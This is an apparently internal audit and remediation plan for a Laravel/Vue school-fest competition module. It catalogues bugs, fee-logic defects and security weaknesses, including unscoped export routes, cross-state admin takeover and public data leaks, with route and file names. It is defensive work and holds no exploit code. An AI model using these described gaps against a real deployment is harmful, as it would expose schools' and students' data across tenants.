# Kalolsavam (Fest) Combined Audit & Remediation Plan

**Status:** Final synthesis of a 3-part audit series.
**Date compiled:** 2026-08-18
**Source documents:** `AUDIT_01_KALOLSAVAM_FEATURES_AND_WORKFLOWS.md` (features & workflows, 80 findings), `AUDIT_02_PHASES_AND_SAHODAYA_FEES.md` (phases & fees, 71 findings), `AUDIT_03_REPORTS_SECURITY_AND_FINAL_GAPS.md` (reports, security, testing, 68 findings + 1 discovered fresh during that audit's own test execution).
**Scope:** The Fest/Kalolsavam competition engine only — event setup, competition setup, school registration, event operations, marks & results, qualification & promotion, certificates & closure, phase-based conduct, fee resolution, reporting/export, and security/data-integrity/test-coverage posture — across School Admin, Sahodaya Admin, State Admin, Portal, Public, and API surfaces. MCQ, Board Results, Training, and Membership are out of scope except where Fest code directly touches them (noted inline wherever that happens).
**Read this document as:** a prioritization tool for a large engineering team, not a press release. Every "PASS," "not_a_gap," or "confirmed working" verdict in this document describes **code and test behavior**, generally against a single seeded tenant (Malappuram Sahodaya) or a scratch-constructed fixture — not a statement that any of the five named comparison Sahodayas (Kochi Metro, Wayanad, Malabar, Vatakara, MCS) has ever been correctly billed, staffed, or operated in a live production account, because none of them exist as a live tenant anywhere in this repository. Section 7 repeats this warning at the point where it matters most.

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Current architecture](#2-current-architecture)
3. [School-to-state workflow map](#3-school-to-state-workflow-map)
4. [Actor and permission matrix](#4-actor-and-permission-matrix)
5. [Feature coverage matrix](#5-feature-coverage-matrix)
6. [Phase lifecycle matrix](#6-phase-lifecycle-matrix)
7. [Sahodaya fee-comparison matrix](#7-sahodaya-fee-comparison-matrix)
8. [Complete report inventory](#8-complete-report-inventory)
9. [Confirmed P0–P3 findings (full deduplicated catalog)](#9-confirmed-p0p3-findings-full-deduplicated-catalog)
10. [Missing features](#10-missing-features)
11. [Security findings](#11-security-findings)
12. [Data-integrity findings](#12-data-integrity-findings)
13. [Financial reconciliation findings](#13-financial-reconciliation-findings)
14. [UI/navigation gaps](#14-uinavigation-gaps)
15. [Performance risks](#15-performance-risks)
16. [Test coverage gaps](#16-test-coverage-gaps)
17. [Product decisions requiring confirmation](#17-product-decisions-requiring-confirmation)
18. [Prioritized remediation roadmap](#18-prioritized-remediation-roadmap)
19. [Recommended implementation order](#19-recommended-implementation-order)
20. [Exact test commands and final results](#20-exact-test-commands-and-final-results)

---

## 1. Executive summary

### 1.1 What this document is

Three independent audits examined the Kalolsavam/Fest module of this Laravel/Vue multi-tenant application, each verifying findings by reading source at cited file:line locations, re-running existing automated tests, and — where no test existed — writing, running, and deleting throwaway scratch tests against real routes/services (never against production, never leaving code behind, never modifying application source). This document is the fourth pass: a synthesis and cross-reference of all three, re-reading all three source documents in full and independently re-deriving the deduplication, the P0 list, and the section-by-section catalogs below, per this task's own brief not to blindly trust a prior summary.

**Raw finding count across the series: 220** (80 + 71 + 69 — the 69 for Audit 3 includes one finding its own team discovered only by freshly re-executing the test suite during that audit, not part of its originally-numbered 68). **After deduplication: 216 distinct findings** (four confirmed cross-report merge groups, detailed in §1.3, collapse 8 raw findings into 4). This is presented as an independently-derived count, not a transcription of an unseen prior tally — treat "roughly 215–220" as the honest precision band, not "216" as a guaranteed-exact figure.

### 1.2 Severity and status, combined

| Severity | Audit 1 | Audit 2 | Audit 3 | Combined (raw) | Combined (deduped) |
|---|---|---|---|---|---|
| P0 | 5 | 6 | 1 | 12 | **11** (EVT-01[Event setup] merges with FEE-01[Financial]) |
| P1 | 20 | 12 | 11 | 43 | **41** (CERT-02 merges with SEC-04[Lifecycle]; PHASE-03 merges with SEC-05[Lifecycle] — both counted from the P1 pool) |
| P2 | 21 | 28 | 28 | 77 | **76** (one merge lands here — see §1.3 note on NAV-03/Event-ops EVT-05, counted at P3 on both sides so it does not move this row) |
| P3 | 34 | 25 | 28+1 new | 88 | **84** (NAV-03 merges with Event-ops EVT-05) |
| **Total** | **80** | **71** | **68+1** | **220** | **216** |

| Status/classification | Meaning | Approximate share |
|---|---|---|
| `confirmed` / `confirmed bug` / `security issue` / `data-integrity issue` / `report mismatch` / `broken workflow` | A real, reproduced defect | ~140 of 216 |
| `not_a_gap` / "not a gap (confirmatory)" | Investigated and found to be correct, working behavior — kept in this document so it isn't mistaken for untested territory | ~45 of 216 |
| `design_gap` / `missing feature` | The capability the workflow implies was never built; not a code defect | ~20 of 216 |
| `test_gap` | Code is correct on inspection or scratch-test; zero permanent regression coverage protects it | ~24 of 216 |
| `likely` | Multi-layer code trace is conclusive but the live failure mode cannot be executed in this sandbox (`TENANCY_DATABASE_PER_SAHODAYA=false` structurally disables the mechanism) | 2 |
| `confirmation_required` / `product decision required` | Cannot be verified or decided without information outside this repository | 2 |

### 1.3 Deduplication: four confirmed merge groups, plus two flagged-not-merged duplicate pairs

Independently cross-referencing all three source documents' full finding text (not just their headline tables) surfaces the same underlying defect described more than once, by different sub-audits, in four cases confidently enough to merge into a single finding in §9. Two further cases — both internal to Audit 3 — are kept as **separate, cross-referenced entries** rather than merged, because each pair was produced by genuinely independent verification passes and both halves carry evidence worth preserving on their own (exactly the treatment the source material itself already applies to the deadest of these — the orphaned policy file).

**Merged (counted once in §9, both source IDs cited on the entry):**

| Merged finding | Sources | What both found, independently |
|---|---|---|
| **Event cancellation always 500s** | `EVT-01` (Audit 1, Event setup, P0) + `FEE-01[Financial]` (Audit 2, P0) | `FestEventStatusService::transitionToCancelled()` references `\App\Support\Enums\FestPageActivity` — a class that does not exist (real class: `App\Support\FestPageActivity`, no `Enums` sub-namespace). Both audits independently traced this to the same line, reproduced the same 500, and recommended the same one-line fix. |
| **`fest.discipline` middleware is fully built and wired to zero routes** | `Event-ops EVT-05` + `NAV-03` (both Audit 1, both P3) | Same dead-middleware root cause, found once from the ops-portal angle and once from the nav/duty-picker angle. |
| **`phase_mode_enabled` has no public-visibility awareness** | `PHASE-03` (Audit 2, P1) + `SEC-05[Lifecycle]` (Audit 3, P1) | Audit 3's own text states this explicitly: *"This directly reconfirms AUDIT_02's own PHASE-03 finding."* Publishing one phase exposes every phase's marks event-wide; the phase-level `results_published` toggle is inert for public visibility. |
| **Disqualification/unpublish never revokes downstream qualifications** | `CERT-02` (Audit 1, P1) + `SEC-04[Lifecycle]` (Audit 3, P2) | `CERT-02`'s own corrected text already names both call sites — "neither `disqualify()` nor the unpublish-correct-republish cycle ever calls this already-existing revoke capability" — and `SEC-04[Lifecycle]` independently rediscovered the unpublish half plus a new detail (`promoteWinners()`'s `results_published` guard is not universal for non-phased events). Merged entry keeps both audits' detail; severity kept at the higher P1. |

**Flagged, not merged — two pairs, both internal to Audit 3, kept as separate §9 entries with an explicit cross-reference note in each, because the source material treats them as independently valuable double-confirmation rather than redundant noise:**

- **`SEC-05[SecAudit]` ↔ `TECH-01[Lifecycle]`** — both P3, both "not a gap (confirmatory)": two separate Audit-3 sub-passes independently confirmed `app/_to_delete/FestReportPolicy.php` (and its sibling `RegionScope.php`) are genuinely orphaned dead code. Kept separate because Audit 3's own text calls this out as deliberate double-verification, not oversight.
- **`SEC-01[Lifecycle]` ↔ `RECON-04`** — P0 and P1 respectively. This is **the single highest-severity finding in the entire series**, and also its clearest internal duplicate: `SEC-01[Lifecycle]` found that all four legacy `FestExportController` routes (`registrations`, `results`, `attendance`, `fees`) skip the region-scoping middleware entirely; `RECON-04`, working independently from the financial-reconciliation angle, rediscovered the exact same bug on the exact same `export.fees` route days apart in the same audit, complete with its own separate scratch-test proof (a planted `424242` fee-total marker recovered cross-region). Both are kept in §9 — `SEC-01[Lifecycle]` as the primary P0 entry (broader: 4 routes), `RECON-04` as a narrower P1 entry with its own distinct evidence — with an explicit note in each that they are the same underlying vulnerability. **Do not read this as two separate P0/P1 bugs when prioritizing** — it is one fix (delete or properly scope `FestExportController`) that closes both.

### 1.4 The 11 P0s, ranked

All are either `confirmed` or empirically proven live via an executed, subsequently-deleted scratch test — none are speculative.

| # | ID | One-line | Source |
|---|---|---|---|
| 1 | `SEC-01[Lifecycle]` (+ `RECON-04`, see above) | 4 legacy export routes let any region_admin retrieve every region's registrations/results/attendance/fee data on a partitioned hub — proven live over real HTTP with planted sentinel data. | Audit 3 |
| 2 | `EVT-01[Event setup]` (+ `FEE-01[Financial]`) | Wrong PHP namespace fatals **every** attempt to cancel **any** Fest event, on any Sahodaya, forever — one-line fix, zero-line coverage. | Audit 1 + Audit 2 |
| 3 | `SCHREG-01` | Bulk-assign and CSV import silently keep only the *last* student when 2+ students share one solo item — full roster loss reported as full success. | Audit 1 |
| 4 | `SCHREG-02` | `registration_locked` blocks new registrations but is never checked on editing an existing one — the "freeze the roster" control doesn't freeze anything. | Audit 1 |
| 5 | `SA-01` | A State Admin can create/edit/deactivate/delete another state's admin accounts — zero `StateScope` reference anywhere in `StateUserController`, in every committed version checked. | Audit 1 |
| 6 | `SA-02` | The entire State-tier isolation mechanism (`StateScope`, `PlatformState`, 4 migrations) exists only in the uncommitted working tree — if deployment builds from `git`, it ships with zero state isolation. | Audit 1 |
| 7 | `PHASE-01` | Editing a phase's registration window/lock/status through the admin UI has zero effect on the actual gates once that phase has synced once — silent no-op edits. | Audit 2 |
| 8 | `MCS-01` | `FestSchoolPhaseRegionService::lockForRegistration()` unconditionally rejects registration for any non-regional phase — structurally blocks 2 of MCS's planned 4 phases (Digi Fest, District Kalotsav) the moment `phased_regional_billing` is used. | Audit 2 |
| 9 | `FEE-01[Snapshot]` | `recalculate()` and 3 sibling methods unconditionally overwrite `total_due` even when the fee is already fully paid, with zero audit trail. | Audit 2 |
| 10 | `FEE-02[Snapshot]` | Invoice status is a sticky OR-clause — once "paid," a re-issued invoice keeps showing "paid" even after `total_amount` silently changes underneath it. | Audit 2 |
| 11 | `FEE-02[Financial]` | Even once the cancellation crash (#2) is fixed, cancelling a batch-billed (MCS-style) event will not credit already-paid schools — the immutability guard from `FEE-01[Snapshot]` freezes the total before the credit is computed, producing `min(0, paid) = 0`. | Audit 2 |

Five of these eleven (`SEC-01[Lifecycle]`, `SCHREG-01`, `SCHREG-02`, `SA-01`, `SA-02`) are live-reachable **today** against the one real seeded tenant. The other six (`PHASE-01`, `MCS-01`, `FEE-01/02[Snapshot]`, `FEE-02[Financial]`) are real, reproduced code defects in mechanisms (`phased_regional_billing`, multi-installment payment, batch cancellation) that have not yet carried live traffic because no second real Sahodaya has been provisioned — their impact is what happens the first time one is, not something already gone wrong in production.

### 1.5 The one theme every audit hit independently

**The entire automated test suite runs with `TENANCY_DATABASE_PER_SAHODAYA=false`, forced by `phpunit.xml` — the exact opposite of production's `true`.** All three audits, working independently, hit this same wall:

- Audit 1 downgraded two findings (`CERT-03`, `SA-03`) to `status: likely` specifically because of it.
- Audit 2 names it as its own P2 finding (`TIF-01`) and documents a trap: calling `config(['tenancy.database_per_sahodaya' => true])` **inside** a test does not activate the real bootstrapper, because `config/tenancy.php` computes its bootstrapper list once at boot from the OS environment variable, not from live `config()` reads. A future engineer "fixing" this with a runtime override would get false confidence.
- Audit 3's `TECH-02[TechAudit]` (cache-tenancy isolation) is gated behind the *same* flag — coincidentally, since cache isolation and DB isolation are conceptually independent mechanisms tied together only by this one env var — and Audit 3's own §9 restates the identical gap for the DB case.

No individual finding gated behind this flag is in doubt — each was traced through multiple code layers and, where possible, proxied with the closest available live mechanism. But a nontrivial cluster of P0–P2 findings (`CERT-03`, `SA-03`, `TECH-02[TechAudit]`) and one whole testing gap (`TIF-01`) cannot be fully closed without either a second real database wired into the test environment or a genuine second live production tenant. Section 17 and the closing "what remains unverified" material return to this.

### 1.6 Vatakara: a blocking gap, not a finding

One of the five Sahodayas this series was asked to verify fee figures for — **Vatakara** — has **zero source material of any kind** anywhere in this repository: no tenant row, no seeder, no config, no test fixture, no documentation, no image, no PDF. A case-insensitive repo-wide search for "vatakara" returns zero hits; `git log` across all history returns zero commits mentioning it. Audit 2 was asked to verify fee numbers against a reference image that was never attached to the workflow. **No Vatakara fee figures appear anywhere in this document, because reporting any would mean fabricating data.** This is not a low-severity documentation gap — see §17.1 for why it blocks sign-off on Vatakara specifically until real reference material is supplied.

### 1.7 How to read the rest of this document

Sections 2–8 are context and cross-cutting matrices, assembled from all three sources plus this pass's own light independent verification (test-suite environment settings, `git status`, the orphaned-policy-file check, and one live test re-run — each noted inline where used). Section 9 is the complete finding catalog — this is the reference section; everything else summarizes or re-slices it by theme. Sections 10–17 re-group §9's findings by category for teams that own one slice (security, data integrity, finance, UI, performance, testing) rather than reading the whole catalog. Sections 18–20 turn the catalog into an actionable plan. Every section that makes a completeness claim also states what it explicitly did not check — per this audit's own governing instruction, no section here claims exhaustive coverage.

---

## 2. Current architecture

### 2.1 Tenancy model

Production runs **one Postgres database per Sahodaya cluster** (`TENANCY_DATABASE_PER_SAHODAYA=true`), switched by `stancl/tenancy`'s `InitializeTenancyByRouteTenant` middleware whenever a route carries a tenant identifier. The entire automated test suite instead runs against a single in-memory SQLite database with that flag forced `false` (independently re-confirmed this pass by reading `phpunit.xml:21,26-29`: `APP_ENV=testing`, `DB_CONNECTION=central`, `DB_DRIVER=sqlite`, `DB_DATABASE=:memory:`, `TENANCY_DATABASE_PER_SAHODAYA=false`). Two structural consequences recur through this whole document (see §1.5): Postgres-only constraints (partial unique indexes gated on `getDriverName() === 'pgsql'`) are invisible to the test suite, and per-tenant database resolution can never be exercised end-to-end in this sandbox.

Only **one Sahodaya tenant is actually seeded anywhere in this repository: Malappuram Sahodaya**, with schools including AMU Residential School. No `FestEvent` competition data is seeded anywhere. Every scenario in this document involving a second tenant, a second region, a phase-based hub, or any of the five named comparison Sahodayas was constructed inside a throwaway scratch test for that one reproduction and then deleted — not found live.

### 2.2 Frontend routing

All Inertia pages for every non-public portal — Super Admin, Sahodaya Admin, School Admin, State Admin, and every Portal role — are served through **one single Inertia entry point**, `resources/js/admin.js`, whose page-loader glob is scoped to `./Pages/Admin/**/*.vue`. Controllers pass a `'{Prefix}/...'` string to `Inertia::render()`; the prefix (`Sahodaya/Events/...`, `School/Events/...`, `StateAdmin/Fest/...`, `Portal/FestOps/...`) determines which file resolves. `resources/js/app.js` is an empty, unbundled stub. **Any `.vue` file outside the `Pages/Admin/**` glob root is dead, unreachable code that still compiles and can still receive commits** — confirmed today to include a byte-identical-but-actively-edited duplicate `Pages/StateAdmin/**` tree (`SA-05`) and at least one materially-better, never-shipped report page (`UI-School EVT-03`); roughly 10 `.vue` files sit outside the glob root in total, only 3 individually diffed by name across the whole series (see §16 and the closing unverified-areas material).

### 2.3 Authorization model

**There are no Laravel Policy classes anywhere in the Fest module** — `app/Policies/` is empty, and the one policy-shaped file in the repository, `app/_to_delete/FestReportPolicy.php`, is genuinely orphaned (re-confirmed independently three separate times across this series: twice within Audit 3's own two sub-passes, `SEC-05[SecAudit]`/`TECH-01[Lifecycle]`, and once more by this synthesis pass directly re-grepping the codebase — zero call sites, zero `Gate::policy()`/`$policies` registration anywhere in the app, and `AppServiceProvider.php:15` is an unrelated `use Stancl\Tenancy\DatabaseConfig;` import that an earlier pass mis-cited as a policy-registration site). Its sibling `app/_to_delete/RegionScope.php` middleware is equally dead. Both are safe to delete outright; neither is a hidden double-authorization risk today, but both are a future-confusion risk (the dead policy's logic has drifted out of sync with the real, already-fixed containment gap in `EventRegionAdminScope`) if left in place.

Authorization is instead entirely: (a) route-middleware aliases (table below), (b) inline Spatie `hasRole`/`hasAnyRole` checks scattered across roughly 45 `SahodayaAdmin\Fest*Controller` files (150+ action methods), and (c) occasional Spatie permission checks. This manual, per-controller, no-auto-scoping pattern is the single structural root cause named or implicated by a large share of this document's P0/P1 security findings — the same class of gap (a route or action that forgets to re-apply a check its siblings already have) recurs independently in region-scoping (`Event-ops EVT-01`, `SEC-01[Lifecycle]`, `NAV-SEC-01`), state-scoping (`SA-01`), and read-vs-write asymmetry (`NAV-SEC-01` again — the shared base controller's permission check only runs on non-GET requests, so 126 of 127 controllers extending it skip permission checks on every read action).

### 2.4 Competition data model

One linear chain, with fees running in parallel:

| Model | Relationships |
|---|---|
| `FestEvent` | hasMany items/registrations/results/phases/registrationBatches/houses/childEvents/schoolPhaseRegionSelections; belongsTo academicYear/parent/parentEvent/conductingSchool/foodHostSchool/region/sourcePhase/registrationBatch/sourceHead. Self-referential parent↔childEvents (state→sahodaya→school cascade, and hub→region/finale partition children). |
| `FestEventPhase` | belongsTo event/sourcePhase/registrationBatch; hasMany items/childPhases/allowedRegions/regionSelections. Self-referential for phase cloning; represents one conduct phase (e.g. a regional heat). One `FestRegistrationBatch` ("Level") owns many `FestEventPhase` rows ("Phase") — this is the correct, current data model (`MCS-07`); an older planning doc uses the opposite terminology and is stale. |
| `FestEventItem` | belongsTo event/head (`FestItemHead`)/area (`FestCompetitionArea`)/phase; hasMany registrations. |
| `FestRegistration` | belongsTo event/item/school/feeReceipt; hasMany groups/participants. Central join of school + item + event. |
| `FestParticipant` | belongsTo registration/group/student/teacher; hasOne mark (`FestMark`). Carries **no foreign key at all** on `student_id`, `teacher_id`, or `event_id` — unlike the same table's `group_id`/`registration_id`, which are real FKs (`TECH-09[TechAudit]`). |
| `FestGroup` | belongsTo registration; hasMany participants (team/pair/trio items). Carries **zero indexes of any kind**, including no chest-number uniqueness — added by one migration, dropped by the next, force-dropped again by a third whose `down()` is a no-op (`TECH-01[TechAudit]`). |
| `FestMark` | belongsTo participant/item. No index with `event_id` as a leftmost column, despite 22 call sites filtering on bare `event_id` (`TECH-05[TechAudit]`). |
| `FestResult` / `FestQualification` | belongsTo event/item/school (Result) or event/item/participant/nextLevelEvent (Qualification — drives promotion). |
| `FestSchoolEventFee` / `FestEventInvoice` | belongsTo event/school/(head/phase/registrationBatch)/feeReceipt. Parallel fee/ledger chain. `override_amount` is fillable and cast but genuinely dead — no code path anywhere writes to it (re-confirmed independently in 3 separate Audit-2 sections). |

### 2.5 Route groups, middleware, and controllers

| Route group | Prefix | Middleware → guard class | Portal | Representative controllers |
|---|---|---|---|---|
| Sahodaya fest engine | `sahodaya-admin/{tenantId}/*` | `sahodaya.admin` → `EnsureSahodayaAdmin` | Sahodaya Admin | ~45 `Fest*Controller` files: Event, MarkEntry, RegistrationReview, ChestNumber, Certificate(Ops), Championship, EventSettings, JudgeAssignment, EventFees, Results, House, Appeal, Catering, ClashReview, Attendance, SubstitutionReview, StateNomination, Report, Export, plus 6 per-program sub-groups |
| Sahodaya fest engine (API) | `api/v1/sahodaya/{tenantId}/*` | `sahodaya.admin.api` → `EnsureSahodayaAdminApi` | Sahodaya API clients | EventsApiController, FestRegistrationsWriteApiController |
| School fest engine | `school-admin/{tenantId}/*` | `school.admin` + `event.coordinator` → `EventCoordinatorScope` | School Admin | FestEventStudentRegistrationController, FestRegistrationController, FestSubstitutionRequestController, FestClashRequestController, FestEventPortalController, food/host-billing, FestSchoolReportController, 5 per-program sub-groups |
| School fest engine (API) | `api/v1/school/{tenantId}/*` | `school.admin.api` | School API clients | FestApiController |
| Fest Ops portal | `portal/fest-ops/{tenantId}/*` | `fest.event.ops` → `EnsureFestEventOps` (sahodaya_admin OR fest_ops role OR **any** `FestEventStaff` row) | Portal (fest_ops / any duty) | FestEventOpsController, FestGateController |
| Mark Coordinator portal | `portal/fest-coordinator/{tenantId}/*` | `fest.mark.coordinator` → `EnsureFestMarkCoordinator` | Portal | FestMarkCoordinatorController |
| State workspace | `admin/state-programs/*`, `admin/kalotsav/*`, `admin/state-workspace/fest/*` | `state.admin` → `EnsureStateAdmin` (state_admin/state_staff, superadmin bypass) | State Admin / Super Admin | StateFestWorkspaceController, KalotsavStateController, StateFestProgramController, StateQualifierReviewController, StateAttendanceController |
| Public site | none (server-rendered, not Inertia) | `web` group only; `/fest/*` prefix in `routes/tenant.php` carries **zero throttle middleware** — the only public group in the file without one (`SEC-02[SecAudit]`) | Public / anonymous | `Public\FestPortalController`; print-only Blade under `resources/views/fest/**` |
| Legacy export routes | `sahodaya-admin/{tenantId}/events/{event}/export/*` | Same `sahodaya.admin` guard, but declared **outside** the `region.report.scope` middleware group the canonical `/reports/*` routes use | Sahodaya Admin | `FestExportController` — this is the P0 region-scope bypass, `SEC-01[Lifecycle]` |
| — (dead) | not attached to any route | `fest.discipline` → `EnsureFestDisciplineAdmin` | — | Fully implemented, wired to zero routes (`Event-ops EVT-05` / `NAV-03`, merged) |

Frontend nav data lives separately from layouts, in `resources/js/support/*.js` (`sahodayaAdminNav.js`, `schoolAdminNav.js`, `adminNav.js`, `festOpsPortalNav.js`, `festCoordinatorPortalNav.js`). **State Admin has no standalone "Fest" nav section** — its links are blended into a generic "State Workspace" section, unlike Sahodaya/School, which each have an explicit one. A second, additive State route file (`routes/state.php`) exists alongside `routes/web.php`'s state routes — confirmed by Audit 3 while investigating `RPT-04`.

### 2.6 Reporting and export architecture

`FestReportCatalog::exports()` defines **50 unique** export ids (independently re-counted by Audit 3 via direct extraction/dedup, correcting an earlier "49" miscount) and `interactivePages()` defines **22**. `SCHOOL_SAFE_EXPORT_IDS`, the allowlist gating which of those 50 a School Admin may export, covers 21. The canonical, region-and-lifecycle-scoped path is `FestReportController::export()` → `FestReportService` → per-report builder methods across `FestEventReportAnalyticsService`, `FestSchoolReportAnalyticsService`, `FestCrossEventReportService`, `FestSchoolReportExportService`. The legacy, unscoped `FestExportController` (4 routes, `registrations`/`results`/`attendance`/`fees`) duplicates part of the same catalog with none of the same protection — this is `SEC-01[Lifecycle]`, §1.4's #1 P0. Spreadsheet output goes through `App\Support\ExcelExport`, which hand-builds "Excel 2003 XML"/SpreadsheetML text and mislabels it `.xls`/`application/vnd.ms-excel` (`EXP-07`) rather than using the real binary-XLSX writer (`openspout`) already used elsewhere in the app for non-Fest exports. PDF output goes through dompdf with a Latin-only bundled font (`EXP-01`) unless an external `PDF_CONVERTER_URL` Chromium service is configured, whose Malayalam-font behavior this repository cannot verify because that service is not present to inspect.

### 2.7 Fee resolution architecture

The live dispatcher is `FestSchoolEventFeeService::resolveSchedule()`, which assembles a schedule through a documented seven-step precedence chain (state-program/legacy/none base source → event `fee_settings` JSON merge → sports-only branch with an all-or-nothing 5-column override → item-catalog defaults → auto-upgrade), followed by a separate, later item-level override chain (`FestItemFeeResolver::amountForItem()`) applied per item at billing time, and finally an optional `school_fee_cap`/`school_fee_min` clamp that — confirmed live — is applied on only one of the four billing code paths (plain `recalculate()`), leaving sports-billed, per-head-billed, and per-phase-billed events with **no cap/floor protection at all** (`FEE-03[Precedence]`). No single function documents this whole chain in one place. Section 7 covers this architecture's behavior against five named Sahodaya scenarios in detail; section 13 covers its confirmed defects.
---

## 3. School-to-state workflow map

The flow below traces one registration from School Admin through Sahodaya Admin fee resolution and phase conduct, through Fest-day operations, marks, results, reports/exports, optionally through the State tier, to the Public site — annotated with the finding IDs that break or gap each step, combined across all three audits. Dotted arrows mark a defect path; solid arrows mark the intended flow. This supersedes and extends Audit 1's own single-audit version of this diagram (§5 there) with the phase/fee mechanics from Audit 2 and the report/security layer from Audit 3.

```mermaid
flowchart TD
    subgraph SCHOOL["School Admin / School Portal"]
        A1["School registers student/team/pair/trio for an item"] --> A2{"Eligibility rules pass?"}
        A2 -->|No| A2X["Rejected"]
        A2 -.->|"rule = require_prior_qualification"| CS02["CS-02: rule is a permanent no-op"]
        A2 -->|Yes| A3{"Registration window open, not locked?"}
        A3 -.->|"phase edited after first sync"| PH01["PHASE-01 (P0): stale phase copy, edit has no effect"]
        A3 -.->|"event.registration_locked=true, this is an EDIT"| SR02["SCHREG-02 (P0): lock never checked on edit"]
        A3 -.->|"MCS-style non-regional phase"| MCS01["MCS-01 (P0): registration structurally blocked"]
        A3 -->|Yes| A4["Registration row created"]
        A4 -.->|"2+ students, one solo item, bulk/CSV"| SR01["SCHREG-01 (P0): only the last student saved"]
        A4 -.->|"2nd pair/trio at same school"| D01["DATA-01: silently overwrites 1st roster"]
        A4 -.->|"routed to a partition-child event"| CS03["CS-03: hub-level eligibility rules stop applying"]
        A4 --> FEE1["Fee schedule resolved: FestSchoolEventFeeService"]
        FEE1 -.->|"Malabar-style combined slab+flat rule"| MLB01["MLB-01: no fee_model can express it"]
        FEE1 -.->|"sports event, one column left blank"| KOCHI07["KOCHI-07: silently defaults to Rs 2,000"]
        FEE1 -.->|"cap configured, sports/per-head/per-phase billing"| FEE03P["FEE-03[Precedence]: cap/floor silently ignored"]
        A4 --> A5{"Item head approval_policy"}
        A5 -->|auto| A6["Auto-approved"]
        A6 -.->|"mandatory item still missing"| CS05["CS-05: mandatory-item check never runs here"]
        A5 -->|manual| A7["Queued for Sahodaya review"]
    end

    subgraph SAHODAYA["Sahodaya Admin"]
        A7 --> B1{"Sahodaya admin approves/rejects"}
        B1 -.->|"bulk reject, no reason"| SR04["SCHREG-04: bulk reject reason optional"]
        B1 -->|Approve| B2["Fee ledger, invoice, chest number assignment"]
        B2 -.->|"already fully paid, schedule edited"| FEE01S["FEE-01/02[Snapshot] (P0): total_due silently overwritten, invoice stays 'paid'"]
        B2 --> B4["Fest day: attendance, gate scan, clash review, appeals, substitutions"]
        B4 -.->|"region_admin via hub URL"| EO01["Event-ops EVT-01: cross-region clash/appeal/attendance writes"]
        B4 -.->|"fest_ops staffer scoped to one unrelated event"| EO02["Event-ops EVT-02: scan/mark attendance on any event"]
        B4 -.->|"appeal filed against a region child"| EO03["Event-ops EVT-03: Appeals queue empty on the hub"]
        B4 -.->|"waitlisted registrations promoted concurrently"| TECH03["TECH-03[TechAudit] (P1): capacity ceiling overshoot, no lock"]
        B4 --> B5["Judges/coordinators enter marks"]
        B5 -.->|"judge-panel item, per-judge subtotal"| M02["Marks EVT-02: subtotal has no upper bound"]
        B5 -.->|"same teacher, two overlapping items"| EO04["Event-ops EVT-04: double-booking undetected"]
        B5 -.->|"duplicate chest number / same student, same item twice"| TECH01T["TECH-01[TechAudit] (P1): no schema-level uniqueness"]
        B5 --> B6{"Publish results"}
        B6 -.->|"default flags, zero marks entered"| M01["Marks EVT-01: publishes anyway by default"]
        B6 -.->|"a performer was disqualified, strict flag on"| M04["Marks EVT-04: publish permanently blocked"]
        B6 --> B7["Results published"]
        B7 --> B7R["Reports & exports generated"]
        B7R -.->|"region_admin, legacy export.* routes"| SEC01L["SEC-01[Lifecycle] (P0) / RECON-04: region-scope bypass, empirically proven"]
        B7R -.->|"any spreadsheet export"| SEC01SA["SEC-01[SecAudit]/EXP-02: CSV/Excel formula injection"]
        B7R -.->|"Malayalam names, any PDF"| EXP01["EXP-01 (P1): tofu boxes, Latin-only font"]
        B7R -.->|"phase_mode_enabled event"| SEC05L["SEC-05[Lifecycle]/PHASE-03 (P1): one phase published exposes all phases"]
        B7R -.->|"multi-installment payment"| RECON01["RECON-01 (P1): 'Paid' shows last receipt only"]
        B7 --> B8["Certificates generated"]
        B8 -.->|"participant later disqualified via appeal"| C02["CERT-02/SEC-04[Lifecycle]: stale winner certificate + qualification survive"]
        B7 --> B9["Winners promoted / qualified to next level"]
        B9 -.->|"re-promote to a corrected target event"| Q02["QUAL-02: silently skipped, no new registration"]
        B7 -.->|"admin unpublishes results"| UNP["unpublish(): FestQualification never revoked (SEC-04[Lifecycle])"]
        B2 -.->|"FEST event cancellation, any Sahodaya"| CANC["EVT-01[Event setup]/FEE-01[Financial] (P0): 500 error, nothing cancels"]
        CANC -.->|"even once fixed, batch-billed (MCS-style)"| FEE02F["FEE-02[Financial] (P0): credit computed as 0"]
    end

    subgraph STATE["State tier"]
        B9 --> S1["Sahodaya nominates / submits qualifiers to State"]
        S1 -.->|"manual nomination, no mark_id lookup"| Q01["QUAL-01: fabricated or altered result can be nominated"]
        S1 --> S2["Maker/checker certifies the nomination batch"]
        S2 --> S3["State conducts finals: judges, marks, chest numbers"]
        S3 --> S4["State admin publishes State results"]
        S4 -.-> SA04["SA-04: no appeals, certificates, or championship standings exist at State tier"]
        S4 -.-> RPT04["RPT-04: no exportable State-level consolidated results/points sheet"]
        S1 -.->|"state_admin acting cross-state"| SA01N["SA-01 (P0): full takeover of another state's admin accounts"]
    end

    subgraph PUBLIC["Public site / API"]
        B7 --> P1["Public results and scoreboard pages"]
        B2 --> P2["Public participant lookup by chest number"]
        P2 -.->|"before schedule_published"| PB01["PUB-01: stage and scheduled time leak anyway"]
        P2 -.->|"query matches no recognized pattern"| PB03["PUB-03: unfiltered roster returned"]
        B8 --> P3["Public certificate QR verification"]
        P3 -.->|"Sahodaya on its own dedicated database"| C03["CERT-03 (likely): tenant DB never resolved"]
        B5 -.->|"a judge enters a qualifying mark"| REC["Athletic record saved"]
        REC -.->|"before results_published"| SEC02L["SEC-02[Lifecycle] (P1): records/live pages leak names+marks"]
    end
```



---

## 4. Actor and permission matrix

| Actor | Portal | Designed capability | Confirmed gaps / risks (finding IDs) |
|---|---|---|---|
| Super Admin | Admin (shared `AdminLayout`) | Everything; also gets the State-tier bypass | `SA-05` (dead duplicate Vue tree is a live churn risk it keeps receiving matching edits on) |
| State Admin (`state_admin`) | State Admin | Manage own state's programs, State Finals judges/marks/attendance/chest numbers, state user accounts | **`SA-01`** (P0 — zero state isolation on state-user management, full cross-state admin takeover), **`SA-02`** (P0 — the state isolation fix for the fest workspace itself is uncommitted), `SA-04` (no appeals/certificates/championship standings exist at this tier at all), `RPT-04` (no exportable consolidated State-level results/points sheet), `SA-03` (Sports/MCQ rollup pages have no graceful degradation if one cluster's DB isn't ready) |
| State Staff (`state_staff`) | State Admin | Same as State Admin, blocked from non-GET on some routes | Inherits `SA-01`'s exposure — `EnsureStateAdmin` admits both roles identically for the affected controller |
| Sahodaya Admin (`sahodaya_admin`) | Sahodaya Admin | Full, unrestricted control of the tenant's own fest events | Subject to the same certificate/marks/registration/fee/report findings as any Sahodaya-scoped actor throughout this document |
